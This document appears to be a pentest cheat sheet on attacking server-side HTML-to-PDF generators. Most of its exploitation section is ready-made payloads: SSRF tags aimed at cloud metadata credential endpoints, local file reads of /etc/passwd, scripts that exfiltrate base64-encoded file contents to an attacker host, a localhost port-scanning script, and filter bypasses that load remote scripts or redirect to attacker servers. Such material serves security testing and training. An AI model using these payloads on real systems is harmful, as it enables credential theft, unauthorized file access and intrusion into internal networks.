# PDF Generation Vulnerabilities

> **Summary**: Server-side HTML-to-PDF converters that process user-controlled input can be exploited to achieve XSS in the PDF context, read local files, perform SSRF, and exfiltrate sensitive data.
> **Impact**: Local file read (e.g., `/etc/passwd`, source code), SSRF to internal services and cloud metadata endpoints, JavaScript execution in the server's PDF rendering context, and internal network port scanning.
> **Typical Severity**: High

---

## Detection

### Indicators
- Application generates PDF reports, invoices, receipts, or exports from user-supplied data
- PDF metadata reveals the rendering engine (check with `exiftool`)
- User-controlled fields appear in the generated PDF (names, addresses, comments, descriptions)
- Application accepts HTML/Markdown input that is rendered into PDF

### Automated Detection
```bash
# Identify the PDF generation library from metadata
exiftool <DOWNLOADED_PDF>
# Look for Creator/Producer fields: wkhtmltopdf, Puppeteer, Chrome Headless, TCPDF, PDFKit, iText, WeasyPrint, Prince
```

### Manual Detection
1. Download a generated PDF and run `exiftool` to identify the rendering engine
2. Inject a simple HTML tag in user-controlled fields: `<b>test</b>` -- check if it renders as bold in the PDF
3. Test for external resource loading: `<img src="http://<COLLABORATOR_URL>/probe">` -- check for DNS/HTTP callback
4. If callback received, the PDF generator processes HTML and fetches external resources

---

## Exploitation

### Prerequisites
- User input is embedded into an HTML template that is converted to PDF server-side
- The PDF generation engine interprets HTML/CSS/JavaScript (wkhtmltopdf, Puppeteer, Chrome Headless, PhantomJS)
- No strict Content Security Policy or network restrictions on the PDF renderer

### Step-by-Step

1. **Identify the PDF generator** -- download a PDF and check `exiftool` output for `Creator` / `Producer`
2. **Test HTML rendering** -- inject `<h1>INJECTED</h1>` in a user field; confirm it renders in the PDF
3. **Test external resource loading** -- inject `<img src="http://<COLLABORATOR>/test">` and check for callback
4. **Attempt local file read** -- use `<iframe>`, `<script>`, or `XMLHttpRequest` to read `file:///etc/passwd`
5. **Attempt SSRF** -- replace `file://` with `http://169.254.169.254/latest/meta-data/` or internal hosts
6. **Exfiltrate data** -- send file contents to an external server via `XMLHttpRequest` or image src encoding
7. **Success criteria** -- local file contents visible in PDF, or external callback received with exfiltrated data

### SSRF Payloads

```html
<!-- Image tag SSRF -->
<img src="http://<COLLABORATOR_URL>/ssrf-test"/>

<!-- Link tag SSRF -->
<link rel="stylesheet" href="http://<COLLABORATOR_URL>/ssrf-css">

<!-- Iframe SSRF -->
<iframe src="http://<COLLABORATOR_URL>/ssrf-iframe"></iframe>

<!-- Cloud metadata SSRF -->
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Internal network scanning -->
<img src="http://127.0.0.1:8080/">
<img src="http://192.168.1.1/">
```

### Local File Read (LFI) Payloads

**Via JavaScript XMLHttpRequest** (most reliable for wkhtmltopdf):
```html
<script>
    x = new XMLHttpRequest();
    x.onload = function(){ document.write(this.responseText) };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

**Via JavaScript with Base64 encoding** (avoids rendering issues):
```html
<script>
    x = new XMLHttpRequest();
    x.onload = function(){ document.write(btoa(this.responseText)) };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

**Via HTML elements** (no JavaScript required):
```html
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
<embed src="file:///etc/passwd" width="800" height="500">
```

**Via PDF annotation** (PD4ML, TCPDF):
```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" />
```

**Via PD4ML attachment** (attaches local files to PDF):
```html
<html>
  <pd4ml:attachment src="/etc/passwd" description="attachment" icon="Paperclip" />
</html>
```

### Blind Exfiltration (When PDF is Not Returned)

When you cannot see the generated PDF, exfiltrate data to an external server:

```html
<!-- Exfiltrate via image src -->
<script>
    x = new XMLHttpRequest();
    x.onload = function(){
        new Image().src = "http://<ATTACKER_HOST>/?data=" + btoa(this.responseText);
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>

<!-- Exfiltrate via redirect -->
<script>
    x = new XMLHttpRequest();
    x.onload = function(){
        document.location = "http://<ATTACKER_HOST>/?data=" + encodeURIComponent(btoa(this.responseText));
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

### SVG-Based Payloads

Useful when the application processes SVG images in the PDF context:

```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="file:///etc/passwd" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>
```

### Path Discovery

Determine the internal file path or URL the PDF bot is rendering from:

```html
<script>document.write(window.location)</script>
<img src="x" onerror="document.write(window.location)" />
```

### Port Scanning via PDF Generator

```html
<script>
const checkPort = (port) => {
    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
        let img = document.createElement("img");
        img.src = `http://<ATTACKER_HOST>/open?port=${port}`;
    });
}
for (let i = 0; i < 10000; i++) { checkPort(i); }
</script>
```

### Proof of Concept
```bash
# 1. Generate a malicious PDF using the tool
python3 malicious-pdf.py <COLLABORATOR_URL>

# 2. Upload or input HTML payload in user-controlled field
# 3. Download generated PDF and check for file contents or collaborator callbacks
```

---

## Bypasses

- **External script loading**: `<script src="http://<ATTACKER>/payload.js"></script>` -- avoids inline JS filters
- **Event handlers**: `<img src=x onerror="<PAYLOAD>">` -- bypass `<script>` tag filters
- **SVG embedding**: use `<foreignObject>` inside SVG to execute HTML/JS
- **Base tag**: `<base href="http://<ATTACKER>/">` -- makes all relative URLs resolve to attacker's server
- **Meta refresh**: `<meta http-equiv="refresh" content="0;url=http://<ATTACKER>/">` -- redirect the renderer
- **CSS import**: `@import url('http://<ATTACKER>/exfil')` -- exfiltrate via stylesheet loading
- **Data URIs**: `<iframe src="data:text/html,<script>...</script>">` -- embed inline HTML

---

## Escalation

- **SSRF to cloud metadata**: read AWS/GCP/Azure instance credentials via `169.254.169.254`
- **Source code read**: `file:///var/www/html/config.php` or application source files
- **Internal service discovery**: port scan internal network from the PDF renderer's perspective
- **Credential harvesting**: read `.env`, `config.yml`, database connection strings
- **Chained XSS**: if the PDF is served inline (not as attachment), XSS in the PDF viewer context
- **RCE via dependency**: some PDF libraries have known command injection vulnerabilities (e.g., CVE in wkhtmltopdf, node-qpdf)

---

## Tools

| Tool | Usage |
|------|-------|
| `exiftool` | Identify PDF generation library from metadata |
| [malicious-pdf](https://github.com/jonaslejon/malicious-pdf) | `python3 malicious-pdf.py <COLLABORATOR_URL>` -- generate test PDFs |
| Burp Collaborator | Detect SSRF callbacks from PDF renderer |
| [interactsh](https://github.com/projectdiscovery/interactsh) | OOB interaction detection for blind testing |
| Burp Suite Repeater | Craft and test HTML injection payloads |

---

## References

- [Exploiting PDF Generators - Intigriti Research](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators)
- [Breaking Down SSRF on PDF Generation - InfoSec Write-ups](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)
- [Escalating XSS in PhantomJS to SSRF/LFI](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
- [Local File Read via XSS in Dynamic PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
- [SVG Cheatsheet](https://github.com/allanlw/svg-cheatsheet)

---

**See also**: [SSRF](ssrf.md) | [XSS](xss.md) | [LFI](lfi.md)
